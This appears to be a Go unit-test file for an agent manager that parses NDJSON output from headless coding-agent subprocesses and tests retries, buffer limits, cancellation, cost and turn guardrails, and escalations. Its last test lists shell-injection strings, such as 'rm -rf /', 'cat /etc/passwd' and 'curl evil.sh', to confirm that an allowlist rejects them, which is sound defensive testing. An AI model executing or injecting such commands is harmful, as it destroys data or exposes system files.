package agent

import (
	"bytes"
	"context"
	"io"
	"log/slog"
	"strings"
	"sync"
	"testing"
	"time"
)

// newParseTestManager returns a Manager suitable for unit-testing
// streamHeadlessOutput: discard logs, no emit, no log dir. The health gate
// and guardrails are left zero so no turn/cost limits fire.
func newParseTestManager(t *testing.T) *Manager {
	t.Helper()
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	emit := func(string, any) {}
	return NewManager(context.Background(), emit, logger, t.TempDir())
}

// lastResult returns the last result event from the agent's output buffer,
// or nil if none.
func lastResult(a *Agent) *StreamEvent {
	out := a.Output()
	for i := len(out) - 1; i >= 0; i-- {
		if out[i].Type == "result" {
			return &out[i]
		}
	}
	return nil
}

func TestParseCodexStreamEvent_AgentMessage(t *testing.T) {
	line := []byte(`{"type":"item.completed","item":{"id":"item_0","type":"agent_message","text":"hi"}}`)

	parsed, err := ParseCodexLine(line)
	if err != nil {
		t.Fatalf("ParseCodexLine: %v", err)
	}
	got := codexEventToStreamEvent(parsed)
	if got.Type != "assistant" {
		t.Fatalf("Type = %q, want assistant", got.Type)
	}
	if got.Content != "hi" {
		t.Fatalf("Content = %q, want hi", got.Content)
	}
}

func TestParseCodexStreamEvent_CommandExecution(t *testing.T) {
	started := []byte(`{"type":"item.started","item":{"id":"item_1","type":"command_execution","command":"pwd","aggregated_output":"","exit_code":null,"status":"in_progress"}}`)
	completed := []byte(`{"type":"item.completed","item":{"id":"item_1","type":"command_execution","command":"pwd","aggregated_output":"/repo\n","exit_code":0,"status":"completed"}}`)

	startParsed, err := ParseCodexLine(started)
	if err != nil {
		t.Fatalf("ParseCodexLine started: %v", err)
	}
	startEv := codexEventToStreamEvent(startParsed)
	if startEv.Type != "tool_use" || startEv.Content != "pwd" {
		t.Fatalf("started = %#v, want tool_use pwd", startEv)
	}

	doneParsed, err := ParseCodexLine(completed)
	if err != nil {
		t.Fatalf("ParseCodexLine completed: %v", err)
	}
	doneEv := codexEventToStreamEvent(doneParsed)
	if doneEv.Type != "tool_result" || doneEv.Content != "/repo\n" {
		t.Fatalf("completed = %#v, want tool_result output", doneEv)
	}
}

func TestParseCodexStreamEvent_TurnCompleted(t *testing.T) {
	line := []byte(`{"type":"turn.completed","usage":{"input_tokens":16012,"cached_input_tokens":2432,"output_tokens":18}}`)

	parsed, err := ParseCodexLine(line)
	if err != nil {
		t.Fatalf("ParseCodexLine: %v", err)
	}
	got := codexEventToStreamEvent(parsed)
	if got.Type != "result" {
		t.Fatalf("Type = %q, want result", got.Type)
	}
	if got.InputTokens != 16012 || got.OutputTokens != 18 {
		t.Fatalf("tokens = %d/%d, want 16012/18", got.InputTokens, got.OutputTokens)
	}
}

func TestParseCodexStreamEvent_Error_SubstringFallback(t *testing.T) {
	line := []byte(`{"type":"error","message":"Service overloaded (529)"}`)

	parsed, err := ParseCodexLine(line)
	if err != nil {
		t.Fatalf("ParseCodexLine: %v", err)
	}
	if parsed.Type != "result" || parsed.Subtype != "error" {
		t.Fatalf("got type=%q subtype=%q, want result/error", parsed.Type, parsed.Subtype)
	}
	got := codexEventToStreamEvent(parsed)
	if got.Type != "result" || got.Subtype != "error" {
		t.Fatalf("StreamEvent type=%q subtype=%q, want result/error", got.Type, got.Subtype)
	}

	if !shouldRetry("", []StreamEvent{got}, nil) {
		t.Fatal("shouldRetry = false, want true (substring fallback on overloaded message)")
	}
}

func TestParseCodexStreamEvent_Error_StructuredCode(t *testing.T) {
	line := []byte(`{"type":"error","message":"Service overloaded","code":529}`)

	parsed, err := ParseCodexLine(line)
	if err != nil {
		t.Fatalf("ParseCodexLine: %v", err)
	}
	if parsed.Result == nil {
		t.Fatal("Result is nil")
	}
	if parsed.Result.ErrorStatus != 529 {
		t.Fatalf("ErrorStatus = %d, want 529", parsed.Result.ErrorStatus)
	}

	got := codexEventToStreamEvent(parsed)
	if got.ErrorStatus != 529 {
		t.Fatalf("StreamEvent.ErrorStatus = %d, want 529", got.ErrorStatus)
	}
	if !shouldRetry("", []StreamEvent{got}, nil) {
		t.Fatal("shouldRetry = false, want true (structured ErrorStatus=529)")
	}
}

func TestParseCodexStreamEvent_Error_StructuredErrorType(t *testing.T) {
	line := []byte(`{"type":"error","message":"Overloaded","error_type":"overloaded_error","code":529}`)

	parsed, err := ParseCodexLine(line)
	if err != nil {
		t.Fatalf("ParseCodexLine: %v", err)
	}
	if parsed.Result == nil {
		t.Fatal("Result is nil")
	}
	if parsed.Result.ErrorType != "overloaded_error" {
		t.Fatalf("ErrorType = %q, want overloaded_error", parsed.Result.ErrorType)
	}

	got := codexEventToStreamEvent(parsed)
	if got.ErrorType != "overloaded_error" {
		t.Fatalf("StreamEvent.ErrorType = %q, want overloaded_error", got.ErrorType)
	}
	if !shouldRetry("", []StreamEvent{got}, nil) {
		t.Fatal("shouldRetry = false, want true (structured ErrorType=overloaded_error)")
	}
}

func TestShouldRetry_Stderr529(t *testing.T) {
	if !shouldRetry("error: 529 overloaded", nil, nil) {
		t.Fatal("shouldRetry = false on stderr containing 529")
	}
}

func TestShouldRetry_FatalError_NoRetry(t *testing.T) {
	events := []StreamEvent{{Type: "result", Subtype: "error", Content: "permission denied"}}
	if shouldRetry("", events, nil) {
		t.Fatal("shouldRetry = true on non-transient error, want false")
	}
}

// TestStreamHeadlessOutput_MalformedMidStream verifies that a malformed
// NDJSON line between two valid events is logged but does NOT break the
// stream — subsequent valid events must still be parsed. A regression that
// aborts the scanner on parse error would drop everything after the bad line.
func TestStreamHeadlessOutput_MalformedMidStream(t *testing.T) {
	input := strings.Join([]string{
		`{"type":"assistant","message":{"content":[{"type":"text","text":"before"}]}}`,
		`{garbled not json`,
		`{"type":"result","result":"done","session_id":"s1","total_cost_usd":0.10,"total_input_tokens":10,"total_output_tokens":5}`,
	}, "\n") + "\n"

	m := newParseTestManager(t)
	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	out := a.Output()
	if len(out) != 2 {
		t.Fatalf("got %d events, want 2 (malformed line must be logged, not abort the stream). events=%+v", len(out), out)
	}
	if out[0].Type != "assistant" || !strings.Contains(out[0].Content, "before") {
		t.Errorf("first event = %+v, want assistant with 'before' content", out[0])
	}
	if out[1].Type != "result" || out[1].Content != "done" {
		t.Errorf("last event = %+v, want result 'done'", out[1])
	}
}

// TestStreamHeadlessOutput_LargeResultContent verifies a near-buffer-limit
// result event is parsed successfully. The scanner buffer is 1 MiB so a
// result with a 512 KiB content field is well within bounds.
func TestStreamHeadlessOutput_LargeResultContent(t *testing.T) {
	const contentSize = 512 * 1024
	big := strings.Repeat("a", contentSize)
	input := `{"type":"result","result":"` + big + `","session_id":"s1","total_cost_usd":0.01,"total_input_tokens":1,"total_output_tokens":1}` + "\n"

	m := newParseTestManager(t)
	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	r := lastResult(a)
	if r == nil {
		t.Fatal("no result event captured")
	}
	if len(r.Content) != contentSize {
		t.Errorf("result content len = %d, want %d (buffer should accept up to 1 MiB)", len(r.Content), contentSize)
	}
}

// TestStreamHeadlessOutput_OversizedLineLogsError exercises the 4 MiB
// scanner cap. A line larger than the buffer makes bufio.Scanner.Scan()
// return false with ErrTooLong; the surrounding loop then logs the error
// via m.logger so operators can diagnose mysterious "agent stopped with no
// result" events. Prior to the fix the scanner error was silently
// swallowed — this test pins that the error now surfaces in logs.
func TestStreamHeadlessOutput_OversizedLineLogsError(t *testing.T) {
	// 5 MiB exceeds the 4 MiB scanner buffer.
	huge := strings.Repeat("x", 5*1024*1024)
	input := `{"type":"result","result":"` + huge + `","session_id":"s1","total_cost_usd":0.01}` + "\n"
	// Trailing valid event is still dropped — ErrTooLong aborts the scanner.
	input += `{"type":"assistant","message":{"content":[{"type":"text","text":"after"}]}}` + "\n"

	var logBuf bytes.Buffer
	logger := slog.New(slog.NewTextHandler(&logBuf, &slog.HandlerOptions{Level: slog.LevelDebug}))
	m := NewManager(context.Background(), func(string, any) {}, logger, t.TempDir())

	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	if got := len(a.Output()); got != 0 {
		t.Errorf("got %d events; want 0 — oversized line should abort scanner", got)
	}
	logs := logBuf.String()
	if !strings.Contains(logs, "stream.error") {
		t.Errorf("expected scanner error to be logged via agent.headless.stream.error; got logs:\n%s", logs)
	}
}

// TestStreamHeadlessOutput_LargeLineUnderBufferCap verifies the new 4 MiB
// cap parses successfully where the old 1 MiB cap would have choked. An
// Opus response with a large dumped command output (~2 MiB content field)
// now round-trips without scanner error.
func TestStreamHeadlessOutput_LargeLineUnderBufferCap(t *testing.T) {
	const contentSize = 2 * 1024 * 1024 // within the 4 MiB buffer
	big := strings.Repeat("a", contentSize)
	input := `{"type":"result","result":"` + big + `","session_id":"s1","total_cost_usd":0.01,"total_input_tokens":1,"total_output_tokens":1}` + "\n"

	m := newParseTestManager(t)
	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	r := lastResult(a)
	if r == nil {
		t.Fatal("no result event captured for 2 MiB line")
	}
	if len(r.Content) != contentSize {
		t.Errorf("content len = %d, want %d (2 MiB should fit in the 4 MiB buffer)", len(r.Content), contentSize)
	}
}

// TestStreamHeadlessOutput_BOMOnFirstLine verifies behavior when the
// provider outputs a UTF-8 BOM before the first NDJSON event. Go's
// json.Unmarshal does not tolerate BOM, so the first event is dropped as a
// parse error; subsequent events must still be parsed cleanly.
func TestStreamHeadlessOutput_BOMOnFirstLine(t *testing.T) {
	bom := "\xef\xbb\xbf"
	input := bom + `{"type":"assistant","message":{"content":[{"type":"text","text":"first"}]}}` + "\n" +
		`{"type":"result","result":"ok","session_id":"s1","total_cost_usd":0.01}` + "\n"

	m := newParseTestManager(t)
	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	out := a.Output()
	if len(out) != 1 {
		t.Fatalf("got %d events, want 1 (BOM-prefixed line should be dropped, subsequent valid line parsed). events=%+v", len(out), out)
	}
	if out[0].Type != "result" {
		t.Errorf("surviving event = %+v, want result", out[0])
	}
}

// TestStreamHeadlessOutput_PartialLineAtEOF verifies that an incomplete
// JSON payload on the last line (no closing brace) is handled: the scanner
// returns the partial content as one final token, json.Unmarshal fails, and
// the event is dropped without aborting the stream or crashing.
func TestStreamHeadlessOutput_PartialLineAtEOF(t *testing.T) {
	input := `{"type":"assistant","message":{"content":[{"type":"text","text":"ok"}]}}` + "\n" +
		`{"type":"result","result":"incomplete`
	// Note: no closing brace, no newline.

	m := newParseTestManager(t)
	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	out := a.Output()
	if len(out) != 1 {
		t.Fatalf("got %d events, want 1 (partial final line must be dropped, not crash). events=%+v", len(out), out)
	}
	if out[0].Type != "assistant" {
		t.Errorf("surviving event = %+v, want assistant", out[0])
	}
}

// TestStreamHeadlessOutput_MultipleResultEvents pins the current semantics
// when a provider emits more than one "result" event in a single stream.
// Both events are recorded in the output buffer; per-run cost accumulates;
// session_id takes the last non-empty value. Callers downstream that pick
// the "final" result via backward scan thus see the last one.
func TestStreamHeadlessOutput_MultipleResultEvents(t *testing.T) {
	input := `{"type":"result","result":"first","session_id":"s1","total_cost_usd":0.10,"total_input_tokens":10,"total_output_tokens":5}` + "\n" +
		`{"type":"result","result":"second","session_id":"s2","total_cost_usd":0.20,"total_input_tokens":20,"total_output_tokens":10}` + "\n"

	m := newParseTestManager(t)
	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	out := a.Output()
	if len(out) != 2 {
		t.Fatalf("got %d result events, want 2 (both must be recorded). events=%+v", len(out), out)
	}
	if got := a.GetCostUSD(); got < 0.29 || got > 0.31 {
		t.Errorf("GetCostUSD = %f, want ~0.30 (accumulated across both results)", got)
	}
	if got := a.GetSessionID(); got != "s2" {
		t.Errorf("GetSessionID = %q, want %q (last non-empty wins)", got, "s2")
	}
	if last := lastResult(a); last == nil || last.Content != "second" {
		t.Errorf("last result content = %+v, want 'second' (backward scan picks final)", last)
	}
}

// TestStreamHeadlessOutput_ContextCancelReturns verifies that when a provider
// subprocess hangs (reader never returns EOF), cancelling the parent context
// causes streamHeadlessOutput to return promptly instead of blocking forever.
// bufio.Scanner does not natively watch context — the cancellation must
// propagate via the child process dying; in unit-test form we use io.Pipe
// where the writer side can be closed on cancel to simulate the same effect.
// A regression that forgot to link ctx to an abort mechanism would hang the
// test. The 3-second deadline catches that.
func TestStreamHeadlessOutput_ContextCancelReturns(t *testing.T) {
	pipeR, pipeW := io.Pipe()
	// Seed one valid line so the scanner is mid-stream when we cancel.
	go func() {
		_, _ = io.WriteString(pipeW, `{"type":"assistant","message":{"content":[{"type":"text","text":"first"}]}}`+"\n")
		// Never write again, never close — simulate a stalled subprocess.
	}()

	m := newParseTestManager(t)
	a := &Agent{ID: "t", Provider: "claude"}

	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	go func() {
		m.streamHeadlessOutput(ctx, a, pipeR, nil)
		close(done)
	}()

	// Give the reader time to consume the first line.
	time.Sleep(100 * time.Millisecond)
	cancel()
	// Closing the writer is what actually unblocks bufio.Scanner — this is
	// the same effect as the subprocess dying after ctx cancel propagates.
	_ = pipeW.Close()

	select {
	case <-done:
		// Good. Stream loop exited within the deadline.
	case <-time.After(3 * time.Second):
		t.Fatal("streamHeadlessOutput did not return within 3s of ctx cancel + reader close; the loop is not wired for cancellation")
	}

	// The single pre-cancel event must have been captured.
	if n := len(a.Output()); n < 1 {
		t.Errorf("expected the pre-cancel event to be recorded, got %d events", n)
	}
}

// TestGuardrails_MaxCostZeroMeansUnlimited pins the zero-as-unlimited
// semantics for MaxCostUSD. Guardrail checks use `maxCost > 0` as the gate;
// a regression that flipped this to `maxCost >= 0` would fire an escalation
// on every result event when the user hasn't set a cost limit — a noisy UX
// break. The test sets MaxCostUSD=0, produces a result with a large cost,
// and verifies NO escalation event is emitted.
func TestGuardrails_MaxCostZeroMeansUnlimited(t *testing.T) {
	input := `{"type":"result","result":"done","session_id":"s1","total_cost_usd":999.99,"total_input_tokens":1,"total_output_tokens":1}` + "\n"

	var escalations int
	var mu sync.Mutex
	emit := func(event string, _ any) {
		if strings.Contains(event, "agent:escalation:") {
			mu.Lock()
			escalations++
			mu.Unlock()
		}
	}
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	m := NewManager(context.Background(), emit, logger, t.TempDir())
	m.SetGuardrails(Guardrails{MaxCostUSD: 0, MaxTurns: 0})

	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	mu.Lock()
	defer mu.Unlock()
	if escalations != 0 {
		t.Errorf("MaxCostUSD=0 should mean unlimited; got %d escalation events", escalations)
	}
}

// TestGuardrails_MaxTurnsZeroMeansUnlimited pins the zero-as-unlimited
// semantics for MaxTurns. The test streams many assistant events with
// MaxTurns=0 and verifies no turns escalation fires. With MaxTurns=0 the
// guardrail block is skipped entirely, so we don't need to wire the
// (nil-by-construction) escalation channel.
func TestGuardrails_MaxTurnsZeroMeansUnlimited(t *testing.T) {
	var lines []string
	for range 20 {
		lines = append(lines, `{"type":"assistant","message":{"content":[{"type":"text","text":"tick"}]}}`)
	}
	input := strings.Join(lines, "\n") + "\n"

	var escalations int
	var mu sync.Mutex
	emit := func(event string, _ any) {
		if strings.Contains(event, "agent:escalation:") {
			mu.Lock()
			escalations++
			mu.Unlock()
		}
	}
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	m := NewManager(context.Background(), emit, logger, t.TempDir())
	m.SetGuardrails(Guardrails{MaxTurns: 0})

	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	mu.Lock()
	defer mu.Unlock()
	if escalations != 0 {
		t.Errorf("MaxTurns=0 should mean unlimited; got %d escalation events after 20 assistant events", escalations)
	}
	if got := len(a.Output()); got != 20 {
		t.Errorf("got %d events, want 20 — stream stopped early", got)
	}
}

// TestGuardrails_SetMidRunVisibleToStream verifies SetGuardrails picks up
// live — the stream loop re-reads m.guardrails under RLock on every event,
// so a user who tightens the cost limit mid-run sees escalation on the
// next result. A regression that cached the guardrails at start of loop
// would miss the new limit and let the agent keep burning budget.
func TestGuardrails_SetMidRunVisibleToStream(t *testing.T) {
	// Result #1 below the eventual limit, result #2 pushes cumulative above.
	input := `{"type":"result","result":"r1","session_id":"s1","total_cost_usd":5.0,"total_input_tokens":1,"total_output_tokens":1}` + "\n" +
		`{"type":"result","result":"r2","session_id":"s1","total_cost_usd":6.0,"total_input_tokens":1,"total_output_tokens":1}` + "\n"

	var (
		escalations int
		mu          sync.Mutex
	)
	var managerRef *Manager
	emit := func(event string, _ any) {
		if strings.Contains(event, "agent:escalation:") {
			mu.Lock()
			escalations++
			mu.Unlock()
		}
		if strings.Contains(event, "agent:output:") && managerRef != nil {
			// Tighten the guardrail the first time we see an output event,
			// so it's already in effect when the loop processes result #2.
			managerRef.SetGuardrails(Guardrails{MaxCostUSD: 10.0})
		}
	}
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	m := NewManager(context.Background(), emit, logger, t.TempDir())
	managerRef = m
	// Start unlimited so result #1 doesn't escalate.
	m.SetGuardrails(Guardrails{MaxCostUSD: 0})

	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	mu.Lock()
	defer mu.Unlock()
	// Cumulative cost after both results = 11.0, > new limit 10.0.
	if escalations != 1 {
		t.Errorf("got %d escalation events, want 1 (limit tightened mid-run should fire on result #2)", escalations)
	}
}

// TestRespondEscalation_DoubleSendRejected verifies the escalation channel
// is buffered size 1 and a second RespondEscalation call before the agent
// drains the first returns a clear error instead of blocking the caller.
// A regression that removed the non-blocking send would hang the UI thread
// when a user double-clicks Approve.
func TestRespondEscalation_DoubleSendRejected(t *testing.T) {
	m, _ := newTestManager(t)
	a := &Agent{ID: "esc1", State: StateRunning, escalationCh: make(chan bool, 1)}
	m.mu.Lock()
	m.agents[a.ID] = a
	m.mu.Unlock()

	if err := m.RespondEscalation(a.ID, true); err != nil {
		t.Fatalf("first RespondEscalation: %v", err)
	}
	// Second call must fail fast (channel full), not block.
	done := make(chan error, 1)
	go func() { done <- m.RespondEscalation(a.ID, true) }()
	select {
	case err := <-done:
		if err == nil {
			t.Fatal("second RespondEscalation returned nil; expected 'channel full' error")
		}
	case <-time.After(500 * time.Millisecond):
		t.Fatal("second RespondEscalation blocked instead of returning error — UI thread would hang")
	}
}

// TestBuildHeadlessInvocation_RejectsShellInjection verifies the safeArgRe
// allowlist refuses values that could inject into the subprocess command
// line. A regression that broadened the regex (e.g. allowing spaces,
// quotes, shell metacharacters) would enable command injection via task
// AllowedTools or Model. The test exercises both the Claude and Codex
// branches since they share the same regex check.
func TestBuildHeadlessInvocation_RejectsShellInjection(t *testing.T) {
	// Tool names with shell metacharacters must be rejected. Hyphen-only
	// strings like "--dangerously-skip-permissions" are NOT listed here
	// intentionally: AllowedTools is joined with "," into a single --allowedTools
	// arg, so a flag-shaped value becomes a tool-name string inside that CSV,
	// not a separate flag. The risk surface is shell metacharacters that could
	// escape quoting, which is what safeArgRe blocks.
	injections := []string{
		"Bash; rm -rf /",
		"Bash`whoami`",
		"Bash $(id)",
		"Bash\"`id`\"",
		"Bash|cat /etc/passwd",
		"Bash && curl evil.sh",
		"Bash\nmalicious", // newline injection
		" Bash",           // leading space
		"Bash ",           // trailing space
		"",                // empty tool name
	}

	for _, bad := range injections {
		t.Run("tool_"+bad, func(t *testing.T) {
			a := &Agent{ID: "a", Provider: "claude"}
			_, _, _, err := buildHeadlessInvocation(a, RunConfig{
				Prompt:       "ok",
				AllowedTools: []string{bad},
			})
			if err == nil {
				t.Errorf("buildHeadlessInvocation accepted injection tool %q; safeArgRe must reject", bad)
			}
		})
	}

	for _, bad := range []string{"sonnet --extra-flag", "opus;id", "gpt-5 $(id)", "model\"inject"} {
		t.Run("model_"+bad, func(t *testing.T) {
			a := &Agent{ID: "a", Provider: "claude", Model: bad}
			_, _, _, err := buildHeadlessInvocation(a, RunConfig{Prompt: "ok"})
			if err == nil {
				t.Errorf("buildHeadlessInvocation accepted injection model %q; safeArgRe must reject", bad)
			}
		})
	}

	// Sanity check: safe tool and model names are accepted.
	a := &Agent{ID: "a", Provider: "claude", Model: "sonnet"}
	_, _, _, err := buildHeadlessInvocation(a, RunConfig{
		Prompt:       "ok",
		AllowedTools: []string{"Bash", "Read", "Write"},
	})
	if err != nil {
		t.Fatalf("safe invocation rejected: %v", err)
	}
}
